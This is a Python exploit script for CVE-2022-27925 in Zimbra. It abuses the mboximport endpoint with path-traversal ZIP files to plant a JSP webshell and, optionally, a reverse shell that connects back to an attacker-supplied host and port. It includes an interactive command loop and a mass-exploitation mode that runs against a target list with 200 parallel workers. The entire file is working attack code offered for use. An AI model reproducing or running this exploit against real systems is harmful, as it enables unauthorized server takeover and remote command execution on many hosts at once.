import argparse
import zipfile
import io
import random
import string
import requests
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


webshell_payload = r'<%@ page import="java.util.*,java.io.*"%><%%><HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUTTYPE="submit" VALUE="Send"></FORM><pre><%if (request.getParameter("cmd") != null) {    out.println("Command: " + request.getParameter("cmd") + "<div>");    Process p;    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));    }    else{        p = Runtime.getRuntime().exec(request.getParameter("cmd"));    }    OutputStream os = p.getOutputStream();    InputStream in = p.getInputStream();    DataInputStream dis = new DataInputStream(in);    String disr = dis.readLine();    while ( disr != null ) {    out.println(disr);    disr = dis.readLine();    }}%><div></pre></BODY></HTML>'
char_set = string.ascii_uppercase + string.digits
revshell_name = "balgo.jsp"
webshell_name = "".join(random.sample(char_set * 6, 6)) + ".jsp"
# vuln_paths = ["service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd", "service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1"]
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RED = "\033[31m"

ITERATE = False


def banner():
    return (
        CYAN
        + """
 _____   _           __              
/__  /  (_)___ ___  / /_  _________ _
  / /  / / __ `__ \/ __ \/ ___/ __ `/
 / /__/ / / / / / / /_/ / /  / /_/ / 
/____/_/_/ /_/ /_/_.___/_/   \__,_/  
                    CVE-2022-27925   
            """
    )


# FIX URL
def fix_url(url):
    if not "://" in url:
        url = "https://" + url
        url = url.rstrip("/")
    return url


def build_zip(jsp, path):
    zip_buffer = io.BytesIO()
    zf = zipfile.ZipFile(zip_buffer, "w")
    zf.writestr(path, jsp)
    zf.close()
    return zip_buffer.getvalue()


def exploit(host, payload, cmd=None):
    headers = {"content-Type": "application/x-www-form-urlencoded"}
    try:

        r = requests.post(
            host + "", data=payload, headers=headers, verify=False, timeout=20
        )
        r = requests.post(
            host
            + "/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1",
            data=payload,
            headers=headers,
            verify=False,
            timeout=20,
        )

        print(
            GREEN + f'[!] Testing {"Webshell" if cmd else "Revshell"}'
        ) if not args.mass else None

        if not cmd and payload and not args.mass:
            r = requests.get(
                host + "/zimbraAdmin/" + revshell_name, verify=False, timeout=20
            )

            if r.status_code == 200:
                print(
                    GREEN
                    + "[+] Revshell location "
                    + host
                    + "/zimbraAdmin/"
                    + revshell_name
                    + ""
                )
            else:
                print(RED + "[!] No revshell ")

            r = requests.get(
                host + "/zimbraAdmin/" + webshell_name + "?cmd=uname+-a",
                verify=False,
                timeout=20,
            )
            print(
                BLUE
                + "[+] Uname -a output: "
                + CYAN
                + r.text.split("<div>")[1].split("</div>")[0].strip()
            )
            return True

        if cmd:
            r = requests.get(
                host + "/zimbraAdmin/" + webshell_name + "?cmd=" + cmd,
                verify=False,
                timeout=20,
            )
            if "Balgogan" in r.text:
                print(CYAN + "[+] Webshell works!!")
                print(
                    GREEN
                    + "[+] WebShell location: "
                    + host
                    + "/zimbraAdmin/"
                    + webshell_name
                    + ""
                )
                return True
            else:
                print(RED + "[-] Target not vulnerable") if not args.mass else None
                return False

    except Exception as e:
        print(RED + "[!] Connection error") if not args.mass else None


def ping_url(url):
    try:
        r = requests.get(url, verify=False, timeout=20)
        if r.status_code == 200:
            print(CYAN + "[!] Target is up!") if not args.mass else None
            return True
        else:
            print(RED + "[!] Target is down! Next >> \n") if not args.mass else None
            return False
    except:
        return False


def main(url):
    paths = [
        "../../../../mailboxd/webapps/zimbraAdmin/",
        "../../../../jetty_base/webapps/zimbraAdmin/",
        "../../../../jetty/webapps/zimbraAdmin/",
    ]
    work = 0
    try:
        for num in range(0, 3):
            print(
                GREEN + "[!] Creating malicious ZIP path: " + BLUE + paths[num]
            ) if not args.mass else None
            zippedfile = build_zip(webshell_payload, paths[num] + webshell_name)
            if revshell_payload:
                zippedfile_revshell = build_zip(
                    revshell_payload, paths[num] + revshell_name
                )
            print(GREEN + "[!] Exploiting!") if not args.mass else None
            if exploit(url, zippedfile, 'echo "Balgogan"'):
                if revshell_payload:
                    exploit(url, zippedfile_revshell)
                if args.target:
                    answer = input(
                        CYAN
                        + "[+] Want to interact with webshell via terminal? (y/n): "
                    )
                    if answer == "y":
                        print(
                            GREEN
                            + "[!] Sending commands to: "
                            + url
                            + "/zimbraAdmin/"
                            + webshell_name
                        ) if not args.mass else None
                        while True:
                            cmd = input(GREEN + "[+] $ > " + BLUE)
                            if cmd == "exit":
                                break
                            req = requests.get(
                                url + "/zimbraAdmin/" + webshell_name + "?cmd=" + cmd,
                                verify=False,
                                timeout=20,
                            )
                            try:
                                print(
                                    CYAN
                                    + req.text.split("<div>")[1]
                                    .split("</div>")[0]
                                    .strip()
                                )
                            except:
                                print(RED + "[!] Error ?")
                    else:
                        print(RED + "[!] Bye!")
                        exit()
                if args.mass:
                    break
                    

    except Exception as e:
        print(RED + "[!] URL Error")
        print(e)
        ITERATE = True


def run(target):
    target = target.rstrip().decode("utf-8")
    url = fix_url(target)
    print(GREEN + "[!] Testing URL: " + url) if not args.mass else None
    if ping_url(url):
        main(url)


if __name__ == "__main__":
    print(banner())
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="URl with protocol HTTPS", default=False)
    parser.add_argument(
        "-m", "--mass", action="store", help="List of targets", default=False
    )
    parser.add_argument(
        "-l", "--lhost", help="Local IP for reverse shell", default=False
    )
    parser.add_argument(
        "-p", "--lport", help="Local port for reverse shell", default=False
    )

    args = parser.parse_args()
    if args.lport and args.lhost:
        revshell_payload = (
            r'<%@page import="java.lang.*"%> <%@page import="java.util.*"%> <%@page import="java.io.*"%> <%@page import="java.net.*"%> <% class StreamConnector extends Thread { InputStream nJ; OutputStream yc; StreamConnector( InputStream nJ, OutputStream yc ) { this.nJ = nJ; this.yc = yc; } public void run() { BufferedReader cA = null; BufferedWriter rKM = null; try { cA = new BufferedReader( new InputStreamReader( this.nJ ) ); rKM = new BufferedWriter( new OutputStreamWriter( this.yc ) ); char buffer[] = new char[8192]; int length; while( ( length = cA.read( buffer, 0, buffer.length ) ) > 0 ) { rKM.write( buffer, 0, length ); rKM.flush(); } } catch( Exception e ){} try { if( cA != null ) cA.close(); if( rKM != null ) rKM.close(); } catch( Exception e ){} } } try { String ShellPath; if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) { ShellPath = new String("/bin/sh"); } else { ShellPath = new String("cmd.exe"); } Socket socket = new Socket(  "'
            + args.lhost
            + r'",'
            + args.lport
            + r"); Process process = Runtime.getRuntime().exec( ShellPath ); ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start(); ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start(); } catch( Exception e ) {} %>"
        )
    else:
        revshell_payload = None

    if args.target:
        url = fix_url(args.target)
        print(GREEN + "[!] Testing URL: " + url)
        if ping_url(url):
            main(url)
    elif args.mass is not False:
        with open(args.mass, "rb") as targets:
            executor = concurrent.futures.ProcessPoolExecutor(200)
            futures = [executor.submit(run, target) for target in targets]
            concurrent.futures.wait(futures)

    else:
        parser.print_help()
        parser.exit()
